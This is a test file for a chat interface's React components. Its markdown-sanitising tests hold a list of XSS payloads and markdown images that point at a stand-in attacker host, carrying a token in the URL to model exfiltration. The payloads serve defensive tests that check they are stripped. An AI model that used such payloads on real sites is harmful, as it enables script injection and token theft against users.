/**
 * Chat components in a DOM (jsdom; DOMPurify's reference DOM, happy-dom does
 * not sanitise correctly): markdown sanitising, optimistic send,
 * snapshot/stream reconciliation, autoscroll pill, 404 after a closed stream.
 * EventSource and fetch are faked; globals are restored after the file.
 */

import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import { JSDOM } from "jsdom";
import type { ChatSnapshot, ChatUserItem } from "../../../ui-api/chat/types";

type Root = import("react-dom/client").Root;
let React: typeof import("react");
let createRoot: typeof import("react-dom/client").createRoot;
let act: typeof import("react").act;
let ChatView: typeof import("./ChatView").ChatView;
let StatusProvider: typeof import("../../shell/status").StatusProvider;
let renderMarkdown: typeof import("./markdown").renderMarkdown;

const realFetch = globalThis.fetch;

class FakeEventSource {
  static all: FakeEventSource[] = [];
  readyState = 0;
  onopen: ((ev: Event) => unknown) | null = null;
  onerror: ((ev: Event) => unknown) | null = null;
  listeners = new Map<string, (ev: MessageEvent) => void>();
  constructor(readonly url: string) {
    FakeEventSource.all.push(this);
  }
  addEventListener(name: string, fn: (ev: MessageEvent) => void) {
    this.listeners.set(name, fn);
  }
  close() {
    this.readyState = 2;
  }
  emit(name: string, data: unknown) {
    this.listeners.get(name)?.({ data: JSON.stringify(data) } as unknown as MessageEvent);
  }
}

type Route = (req: { url: string; method: string; body: unknown }) => Response | Promise<Response>;
let routes: Route = () => Response.json({ error: "no route" }, { status: 500 });
const calls: { url: string; method: string; body: unknown }[] = [];
let statusPaused = false;

// jsdom window properties Bun lacks become globals for this file only.
const added: string[] = [];
function installDom() {
  const dom = new JSDOM("<!doctype html><html><body></body></html>", { url: "http://localhost/chat/k1", pretendToBeVisual: true });
  const win = dom.window as unknown as Record<string, unknown>;
  const g = globalThis as unknown as Record<string, unknown>;
  for (const key of Object.getOwnPropertyNames(win)) {
    if (key in g || key.startsWith("_")) continue;
    g[key] = win[key];
    added.push(key);
  }
  g.window = win;
  g.document = win.document;
  g.navigator = win.navigator;
  added.push("window", "document", "navigator");
}

beforeAll(async () => {
  installDom();
  (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
  React = await import("react");
  act = React.act;
  ({ createRoot } = await import("react-dom/client"));
  ({ ChatView } = await import("./ChatView"));
  ({ StatusProvider } = await import("../../shell/status"));
  ({ renderMarkdown } = await import("./markdown"));
});

afterAll(async () => {
  globalThis.fetch = realFetch;
  const g = globalThis as unknown as Record<string, unknown>;
  for (const key of added) delete g[key];
});

let root: Root | null = null;
let host: HTMLElement | null = null;

afterEach(() => {
  act(() => root?.unmount());
  host?.remove();
  root = null;
  FakeEventSource.all = [];
  calls.length = 0;
  statusPaused = false;
});

function installFakes() {
  (globalThis as unknown as { EventSource: unknown }).EventSource = FakeEventSource;
  window.EventSource = FakeEventSource as unknown as typeof EventSource;
  const fake = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    const method = init?.method ?? "GET";
    let body: unknown = init?.body;
    if (typeof body === "string") body = JSON.parse(body);
    // The shell's status poll (ChatView reads the paused flag); kept out of `calls`.
    if (url.startsWith("/ui/api/status")) return Response.json({ control: { paused: statusPaused }, running: [], integrations: [], services: [] });
    const req = { url, method, body };
    calls.push(req);
    if (url.startsWith("/ui/api/meta")) return Response.json({ agentName: "Atlas", timeZone: "UTC" });
    return routes(req);
  }) as typeof fetch;
  globalThis.fetch = fake;
  window.fetch = fake;
}

const snapshot = (over: Partial<ChatSnapshot> = {}): ChatSnapshot => ({
  session: {
    key: "k1",
    title: "Trip",
    createdAt: "2026-09-20T10:00:00.000Z",
    updatedAt: "2026-09-20T10:00:00.000Z",
    archivedAt: null,
    lastActivityAt: "2026-09-20T10:00:00.000Z",
    messageCount: 0,
    preview: null,
    sessionId: "sess-1",
    isDefault: false,
    stats: { costUsd: 0.5, runs: 2 },
  },
  items: [],
  drafts: [],
  run: { state: "idle", since: null, canStop: false },
  truncated: false,
  ...over,
});

const userItem = (id: number, text: string, clientId?: string): ChatUserItem => ({
  kind: "user",
  id: `u:${id}`,
  messageId: id,
  text,
  attachments: [],
  at: new Date().toISOString(),
  ...(clientId ? { clientId } : {}),
});

async function mount() {
  installFakes();
  host = document.createElement("div");
  document.body.appendChild(host);
  root = createRoot(host);
  await act(async () => {
    root!.render(
      React.createElement(
        StatusProvider,
        null,
        React.createElement(ChatView, { sessionKey: "k1", onSessionsChanged: () => {}, onDeleted: () => {}, onToggleSidebar: () => {} }),
      ),
    );
  });
  return FakeEventSource.all[0]!;
}

const q = (sel: string) => host!.querySelector(sel);
const qa = (sel: string) => [...host!.querySelectorAll(sel)];
const tick = (ms = 0) => new Promise((r) => setTimeout(r, ms));

async function typeAndEnter(text: string) {
  const ta = q("textarea.chat-input") as HTMLTextAreaElement;
  await act(async () => {
    const setter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value")!.set!;
    setter.call(ta, text);
    ta.dispatchEvent(new window.Event("input", { bubbles: true }));
  });
  await act(async () => {
    ta.dispatchEvent(new window.KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
  });
}

describe("renderMarkdown", () => {
  const payloads = [
    `<script>window.__xss = 1</script>`,
    `<img src=x onerror="window.__xss = 2">`,
    `[click](javascript:window.__xss=3)`,
    `<a href="javascript:window.__xss=4">x</a>`,
    `<svg onload="window.__xss=5"><circle/></svg>`,
    `<iframe src="javascript:window.__xss=6"></iframe>`,
    `<details open ontoggle="window.__xss=7">x</details>`,
    `<a href="data:text/html,<script>alert(1)</script>">d</a>`,
    `<form action="https://evil.example"><input name=q><button formaction="javascript:alert(1)">go</button></form>`,
    `<div style="background:url(javascript:alert(1))">s</div>`,
  ];

  test("XSS payloads are stripped and do not execute", async () => {
    for (const p of payloads) {
      const html = renderMarkdown(`hello ${p} world`);
      const box = document.createElement("div");
      box.innerHTML = html;
      document.body.appendChild(box);
      expect(box.querySelector("script, iframe, form, object, embed")).toBeNull();
      for (const el of box.querySelectorAll("*")) {
        for (const attr of el.getAttributeNames()) {
          expect(attr.startsWith("on")).toBe(false);
          const v = el.getAttribute(attr) ?? "";
          expect(/^\s*(javascript|data):/i.test(v)).toBe(false);
        }
      }
      box.remove();
    }
    await tick(10);
    expect((window as unknown as { __xss?: number }).__xss).toBeUndefined();
  });

  test("renders GFM and opens external links in a new tab", () => {
    const box = document.createElement("div");
    box.innerHTML = renderMarkdown("**bold**\nline two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```ts\nconst x = 1;\n```\n\n[ext](https://example.com) [rel](/activity)");
    expect(box.querySelector("strong")?.textContent).toBe("bold");
    expect(box.querySelector("br")).not.toBeNull();
    expect(box.querySelector("table td")?.textContent).toBe("1");
    expect(box.querySelector("pre code")?.textContent).toContain("const x = 1;");
    const [ext, rel] = [...box.querySelectorAll("a")];
    expect(ext!.getAttribute("target")).toBe("_blank");
    expect(ext!.getAttribute("rel")).toBe("noopener noreferrer");
    expect(rel!.getAttribute("target")).toBeNull();
  });

  test("remote images become links (no request on render); local images stay", () => {
    const box = document.createElement("div");
    box.innerHTML = renderMarkdown(
      "![secret](https://attacker.example/?d=token) ![x](//attacker.example/p.png) ![local](/ui/api/chat/attachments/a1) " +
        '<img src="https://attacker.example/a.png" srcset="https://attacker.example/b.png 2x"> <video src="https://attacker.example/v.mp4"></video>',
    );
    const imgs = [...box.querySelectorAll("img")];
    expect(imgs.map((i) => i.getAttribute("src"))).toEqual(["/ui/api/chat/attachments/a1"]);
    expect(box.querySelector("video")).toBeNull();
    expect(box.innerHTML).not.toContain("srcset");
    const links = [...box.querySelectorAll("a")].map((a) => [a.textContent, a.getAttribute("href")]);
    expect(links).toContainEqual(["[image: secret]", "https://attacker.example/?d=token"]);
    expect(links).toContainEqual(["[image: x]", null]);
  });
});

describe("ChatView", () => {
  test("assistant markdown from the stream is sanitised in the DOM", async () => {
    routes = () => Response.json({}, { status: 404 });
    const es = await mount();
    await act(async () => {
      es.emit("snapshot", snapshot({ items: [{ kind: "assistant", id: "a:1:0", streamId: "m1", at: null, text: `ok <img src=x onerror="window.__xss=9"> <script>window.__xss=10</script>` }] }));
    });
    const md = q(".chat-md")!;
    expect(md.innerHTML).not.toContain("onerror");
    expect(md.querySelector("script")).toBeNull();
    expect((window as unknown as { __xss?: number }).__xss).toBeUndefined();
  });

  test("optimistic send → one bubble, whatever order the POST response and stream item arrive in", async () => {
    let release!: (r: Response) => void;
    routes = (req) => {
      if (req.method === "POST" && req.url.endsWith("/messages")) return new Promise<Response>((r) => (release = r));
      return Response.json({ error: "?" }, { status: 500 });
    };
    const es = await mount();
    await act(async () => {
      es.onopen?.(new Event("open"));
      es.emit("snapshot", snapshot());
    });
    expect(q(".empty-state")?.textContent).toContain("Start a conversation");

    await typeAndEnter("hello agent");
    const post = calls.find((c) => c.method === "POST")!;
    expect(post.url).toBe("/ui/api/chat/sessions/k1/messages");
    const { content, clientId } = post.body as { content: string; clientId: string };
    expect(content).toBe("hello agent");
    expect(clientId).toBeTruthy();
    expect(qa(".chat-row-user")).toHaveLength(1);
    expect(q(".chat-row.is-pending")?.textContent).toContain("Sending…");
    expect((q("textarea.chat-input") as HTMLTextAreaElement).value).toBe("");

    // Stream first, then the POST response.
    await act(async () => es.emit("item", { item: userItem(7, "hello agent", clientId) }));
    expect(qa(".chat-row-user")).toHaveLength(1);
    expect(q(".chat-row.is-pending")).toBeNull();
    await act(async () => {
      release(Response.json({ item: userItem(7, "hello agent", clientId), triggered: true }, { status: 201 }));
      await tick();
    });
    expect(qa(".chat-row-user")).toHaveLength(1);
    // A reconnect snapshot with the same message still shows it once.
    await act(async () => es.emit("snapshot", snapshot({ items: [userItem(7, "hello agent")] })));
    expect(qa(".chat-row-user")).toHaveLength(1);
    expect(q(".alert")).toBeNull();
  });

  test("failed send keeps the bubble with the server error, Retry resends with the same clientId", async () => {
    let n = 0;
    routes = (req) => {
      if (req.method !== "POST") return Response.json({}, { status: 500 });
      n++;
      const { clientId } = req.body as { clientId: string };
      return n === 1
        ? Response.json({ error: "Atlas is paused" }, { status: 409 })
        : Response.json({ item: userItem(8, "hi", clientId), triggered: false }, { status: 201 });
    };
    const es = await mount();
    await act(async () => es.emit("snapshot", snapshot()));
    await typeAndEnter("hi");
    await act(() => tick());
    expect(q(".chat-row.is-failed")?.textContent).toContain("Atlas is paused");
    const retry = qa(".chat-row.is-failed button").find((b) => b.textContent === "Retry") as HTMLButtonElement;
    await act(async () => {
      retry.click();
      await tick();
    });
    const posts = calls.filter((c) => c.method === "POST").map((c) => (c.body as { clientId: string }).clientId);
    expect(posts).toHaveLength(2);
    expect(posts[0]).toBe(posts[1]!);
    expect(q(".chat-row.is-pending")).toBeNull();
    expect(qa(".chat-row-user")).toHaveLength(1);
    expect(q(".alert")?.textContent).toContain("Saved, but the agent could not be started");
  });

  test("streaming draft is replaced by the final item; run badge and typing indicator follow the run", async () => {
    routes = () => Response.json({}, { status: 500 });
    const es = await mount();
    await act(async () => es.emit("snapshot", snapshot({ items: [userItem(1, "q")], run: { state: "starting", since: new Date().toISOString(), canStop: false } })));
    expect(q(".chat-header .badge")?.textContent).toContain("Starting");
    expect(q(".chat-typing")).not.toBeNull();
    await act(async () => {
      es.emit("run", { state: "running", since: new Date().toISOString(), canStop: true });
      es.emit("delta", { streamId: "m1", text: "Hel" });
      es.emit("delta", { streamId: "m1", text: "lo" });
      await tick(40);
    });
    expect(q(".chat-header .badge")?.textContent).toContain("Working");
    expect(qa(".chat-header button").some((b) => b.textContent === "Stop turn")).toBe(true);
    expect(q(".is-draft")?.textContent).toContain("Hello");
    expect(q(".chat-typing")).toBeNull();
    await act(async () => {
      es.emit("item", { item: { kind: "assistant", id: "a:x:0", streamId: "m1", text: "Hello!", at: null } });
      es.emit("run", { state: "idle", since: null, canStop: false });
    });
    expect(q(".is-draft")).toBeNull();
    expect(qa(".chat-bubble-assistant")).toHaveLength(1);
    expect(q(".chat-header .badge")).toBeNull();
  });

  test("autoscroll: follows at the bottom, shows the pill when scrolled up", async () => {
    routes = () => Response.json({}, { status: 500 });
    const es = await mount();
    await act(async () => es.emit("snapshot", snapshot({ items: [userItem(1, "a")] })));
    const scroller = q(".chat-scroll") as HTMLDivElement;
    let scrollTop = 0;
    Object.defineProperty(scroller, "scrollHeight", { configurable: true, get: () => 2000 });
    Object.defineProperty(scroller, "clientHeight", { configurable: true, get: () => 500 });
    Object.defineProperty(scroller, "scrollTop", { configurable: true, get: () => scrollTop, set: (v: number) => (scrollTop = Math.min(v, 1500)) });

    // At the bottom: new content scrolls down, no pill.
    scrollTop = 1450;
    await act(async () => scroller.dispatchEvent(new window.Event("scroll")));
    await act(async () => es.emit("item", { item: userItem(2, "b") }));
    expect(scrollTop).toBe(1500);
    expect(q(".chat-new-pill")).toBeNull();

    // Scrolled up: position kept, pill shown.
    scrollTop = 200;
    await act(async () => scroller.dispatchEvent(new window.Event("scroll")));
    await act(async () => es.emit("item", { item: userItem(3, "c") }));
    expect(scrollTop).toBe(200);
    const pill = q(".chat-new-pill") as HTMLButtonElement;
    expect(pill).not.toBeNull();

    await act(async () => pill.click());
    expect(scrollTop).toBe(1500);
    expect(q(".chat-new-pill")).toBeNull();

    // Own send always scrolls down, even when scrolled up.
    scrollTop = 100;
    await act(async () => scroller.dispatchEvent(new window.Event("scroll")));
    routes = () => new Promise<Response>(() => {});
    await typeAndEnter("mine");
    expect(scrollTop).toBe(1500);
    expect(q(".chat-new-pill")).toBeNull();
  });

  test("closed stream: 404 on the session shows not found; otherwise reconnect is scheduled", async () => {
    routes = (req) => (req.url === "/ui/api/chat/sessions/k1" ? Response.json({ error: "Not found" }, { status: 404 }) : Response.json({}, { status: 500 }));
    const es = await mount();
    await act(async () => {
      es.readyState = 2;
      es.onerror?.(new Event("error"));
      await tick(5);
    });
    expect(q(".empty-state")?.textContent).toContain("Chat not found");
    expect(FakeEventSource.all).toHaveLength(1);
  });

  test("reconnecting banner while the browser retries, gone after open", async () => {
    routes = () => Response.json({}, { status: 500 });
    const es = await mount();
    await act(async () => es.emit("snapshot", snapshot()));
    await act(async () => {
      es.readyState = 0;
      es.onerror?.(new Event("error"));
    });
    expect(q(".chat-banner")?.textContent).toContain("reconnecting");
    await act(async () => {
      es.readyState = 1;
      es.onopen?.(new Event("open"));
    });
    expect(q(".chat-banner")).toBeNull();
  });

  test("voice: record, send as multipart with the UI header, show Transcribing… until the response", async () => {
    const stopped: string[] = [];
    class FakeRecorder {
      static isTypeSupported = (t: string) => t === "audio/ogg;codecs=opus";
      state = "inactive";
      mimeType: string;
      ondataavailable: ((e: { data: Blob }) => void) | null = null;
      onstop: (() => void) | null = null;
      constructor(_s: unknown, opts?: { mimeType?: string }) {
        this.mimeType = opts?.mimeType ?? "";
      }
      start() {
        this.state = "recording";
      }
      stop() {
        this.state = "inactive";
        this.ondataavailable?.({ data: new Blob(["abc"], { type: this.mimeType }) });
        this.onstop?.();
      }
    }
    const g = window as unknown as Record<string, unknown>;
    g.MediaRecorder = FakeRecorder;
    (globalThis as Record<string, unknown>).MediaRecorder = FakeRecorder;
    Object.defineProperty(navigator, "mediaDevices", {
      configurable: true,
      value: { getUserMedia: async () => ({ getTracks: () => [{ stop: () => stopped.push("track") }] }) },
    });
    const origCreate = URL.createObjectURL;
    URL.createObjectURL = () => "blob:local";
    URL.revokeObjectURL = () => {};

    let release!: (r: Response) => void;
    let captured: { form: FormData; headers: Record<string, string> } | null = null;
    routes = () => Response.json({}, { status: 500 });
    const es = await mount();
    const fetchBefore = globalThis.fetch;
    const wrapped = (async (input: RequestInfo | URL, init?: RequestInit) => {
      if (init?.body instanceof FormData) {
        captured = { form: init.body, headers: init.headers as Record<string, string> };
        return new Promise<Response>((r) => (release = r));
      }
      return fetchBefore(input, init);
    }) as typeof fetch;
    globalThis.fetch = wrapped;
    await act(async () => es.emit("snapshot", snapshot()));

    const mic = q("button[aria-label='Record a voice message']") as HTMLButtonElement;
    expect(mic).not.toBeNull();
    await act(async () => {
      mic.click();
      await tick();
    });
    expect(q(".chat-recorder")?.textContent).toContain("0:00");
    const send = qa(".chat-recorder button").find((b) => b.textContent === "Send voice") as HTMLButtonElement;
    await act(async () => {
      send.click();
      await tick();
    });
    expect(stopped).toEqual(["track"]);
    expect(captured).not.toBeNull();
    const { form, headers } = captured!;
    expect(headers["X-Atlas-UI"]).toBe("1");
    expect(headers["Content-Type"]).toBeUndefined();
    const file = form.get("file") as File;
    expect(file.name).toMatch(/^voice-.*\.ogg$/);
    expect(file.type).toBe("audio/ogg;codecs=opus");
    expect(form.get("message")).toBeNull();
    const clientId = form.get("clientId") as string;
    expect(clientId).toBeTruthy();
    expect(q(".chat-row.is-pending")?.textContent).toContain("Transcribing…");
    expect(q(".chat-row.is-pending audio")?.getAttribute("src")).toBe("blob:local");

    await act(async () => {
      release(Response.json({ item: { ...userItem(11, "transcribed text", clientId) }, triggered: true }, { status: 201 }));
      await tick();
    });
    expect(q(".chat-row.is-pending")).toBeNull();
    expect(q(".chat-user-text")?.textContent).toBe("transcribed text");
    URL.createObjectURL = origCreate;
    delete g.MediaRecorder;
    delete (globalThis as Record<string, unknown>).MediaRecorder;
  });

  test("archived chat: composer disabled with a hint", async () => {
    routes = () => Response.json({}, { status: 500 });
    const es = await mount();
    const s = snapshot();
    await act(async () => es.emit("snapshot", { ...s, session: { ...s.session, archivedAt: "2026-09-20T12:00:00.000Z" } }));
    expect(q("textarea.chat-input")).toBeNull();
    expect(q(".chat-composer-hint")?.textContent).toBe("Unarchive to continue");
    expect(qa(".chat-header button").some((b) => b.textContent === "Unarchive")).toBe(true);
  });

  test("paused Atlas: composer disabled with a hint instead of failing sends", async () => {
    statusPaused = true;
    routes = () => Response.json({}, { status: 500 });
    const es = await mount();
    await act(async () => es.emit("snapshot", snapshot()));
    await act(async () => await new Promise((r) => setTimeout(r, 20)));
    expect(q("textarea.chat-input")).toBeNull();
    expect(q(".chat-composer-hint")?.textContent).toContain("Atlas is paused");
  });
});
